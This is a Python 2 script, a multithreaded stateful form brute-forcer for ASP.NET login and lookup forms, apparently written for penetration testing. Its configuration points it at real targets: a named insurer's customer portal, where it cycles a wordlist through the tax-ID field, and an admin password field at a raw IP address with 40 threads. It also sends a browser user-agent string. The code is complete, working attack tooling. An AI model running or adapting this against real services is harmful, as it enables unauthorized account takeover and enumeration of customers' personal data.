#!/usr/bin/env python2
#jesus.olmos@blueliv.com

# Stateful Form Bruteforcer, useful for .net viewstates and so on

# - multithread (configurable thread number)
# - post stateful bruteforce
# - can bruteforce multiple params
# - can set fixed params
# - automated result analysis 
# - verbose and silent mode


import re
import sys
import time
from mechanize import Browser
from threading import Thread, Lock


############################ CONFIGURE ATTACK ##################################
def configure():
	sb = StatefulBrute('https://www.clickseguros.es/portal/clientes/ODA/ConsultaOda.aspx?Anthem_CallBack=false')	
	sb.setWordlist('/home/sha0/audit/wordlist/all.wl')
	sb.setBruteParam('MPG_CPHC_GwcCampoNIF')
	#sb.setBruteParam('MPG%24CPHC%24GwcCampoNIF')
	sb.listParams()
	sb.run()



	sys.exit(1)
	sb = StatefulBrute('https://91.223.125.61/login.aspx?ReturnUrl=/default.aspx')
	sb.threads = 40
	sb.setWordlist('/home/sha0/audit/wordlist/openwall_spanish')
	#sb.setWordlist('/home/sha0/audit/wordlist/evil')
	sb.setFixedParam('SG:txtUsername','admin')
	#sb.setFixedParam('SG:cmdLogin.x',51)
	#sb.setFixedParam('SG:cmdLogin.y',17)
	sb.setBruteParam('SG:txtPassword')
	sb.run()
###############################################################################



class StatefulBrute:
	def __init__(self,url):
		self.url = url
		self.wordlist = []
		self.fixed = []
		self.brute = []
		self.wordlist_size = 0
		self.threads = 30
		self.results = []		
		self.showData = 1

	def setWordlist(self,filename):
		print "loading ..."
		fd = open(filename)
		wl = fd.readlines()
		fd.close()	
		self.wordlist_size = 0
		for w in wl:
			w = w.replace('\n','')
			w = w.replace('\r','')
			self.wordlist.append(w)
			self.wordlist_size += 1
		print "%d words loaded" % self.wordlist_size

	def setFixedParam(self,field,value):
		self.fixed.append([field,value])

	def setBruteParam(self,field):
		self.brute.append(field)

	def run(self):
		wpt = int(self.wordlist_size/(float(self.threads)-1))-1
		resto = self.wordlist_size - (wpt*(self.threads-1))
		th = []

		lck = Lock()
		init_time = time.time()


		if resto > 0:
			words = []
			for w in range(0,resto):
				words.append(self.wordlist.pop())
			t = Thread(target=self.__thread,  args=(self.url,words,self.fixed,self.brute,lck))
			t.start()
			th.append(t)

		for t in range(0,self.threads-1):
			words = []
			for w in range(0,wpt):
				words.append(self.wordlist.pop())
			t = Thread(target=self.__thread, args=(self.url,words,self.fixed,self.brute,lck))
			t.start()
			th.append(t)

		if resto > 0:
			print "%d words per thread" % wpt
			print "extra thread with %d words" % len(words)

		for t in th:
			t.join()	

		end_time = time.time()
		duration = (end_time-init_time)
		print "Finished in %d seconds, %d words per second." % (duration, self.wordlist_size/int(duration))
		self.__analyze()


	def __init_mechanize(self):
                b = Browser()
                b.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1')]
                b.set_handle_robots(False)
		return b

	def listParams(self):
		b = self.__init_mechanize()
		b.open(self.url)
		b.select_form(nr=0)
		for c in b.controls:
			print "%s %s %s" % (c.id,c.name,c.readonly)


	def __thread(self,url,words,fixed,brute,lck):
		b = self.__init_mechanize()	
		b.open(url)
		for w in words:
			b.select_form(nr=0)  # by thefault the form 0 is the target, change this if needed 
			for f, v in fixed:
				b[f] = v
			for c in brute:
				b[c] = w
			resp = b.submit()
			self.__parse(w,resp,lck)

		lck.acquire()
		self.threads -= 1
		lck.release()

	def __parse(self,word,resp,lck):
		html = resp.readlines()
		headers = resp.info()
		lines = len(html)
		words = 0
		for l in html:
			l = re.sub(' *',' ',l)
			words += len(l.split(' '))
		if self.showData:
			print "%s --> code:%d lines:%d words:%d " % (word,resp.code,lines,words)
		lck.acquire()
		self.results.append([word,resp.code,lines,words])
		lck.release()

	def __analyze(self):
		hash = []
		for w,c,l,ws in self.results:
			hash.append("%d:%d:%d" % (c,l,ws))

		hash.sort()	
		last = ''
		amount = 0
		print "--- Analysis ---"
		for i in range(0,len(hash)):
			if last != hash[i]:
				if amount>0:
					c,l,w = last.split(':')
					print "%d code:%s lines:%s words:%s %s" % (amount,c,l,w,self.__hash2words(last))
					amount = 0
				last = hash[i]
			amount += 1
		c,l,w = last.split(':')
		print "%d code:%s lines:%s words:%s %s" % (amount,c,l,w,self.__hash2words(last))
		print "----------------"

	def __hash2words(self,hash):
		res = []
		cc, ll, wws = hash.split(':')
		#print "-> %d %d %d" % (int(cc),int(ll),int(wws))
		for w,c,l,ws in self.results:
			if c == int(cc) and l == int(ll) and ws == int(wws):
				res.append(w)
		if len(res)>10:
			res = ['Normal response']
		return res	


if __name__ == "__main__":
	configure()	

